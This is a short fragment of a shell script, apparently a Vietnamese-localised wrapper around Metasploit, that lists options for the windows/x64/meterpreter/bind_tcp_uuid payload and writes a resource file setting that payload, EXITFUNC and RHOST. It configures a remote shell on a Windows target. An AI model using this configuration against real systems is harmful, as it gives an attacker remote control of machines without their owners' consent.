...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/x64/meterpreter/bind_tcp_uuid):
...
config_file="$payload_path_present/Config/config"
	echo "set payload windows/x64/meterpreter/bind_tcp_uuid" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	echo "set RHOST $rhost" >> $rc_file
	paylo="windows/x64/meterpreter/bind_tcp_uuid"
	lport=$lport
}
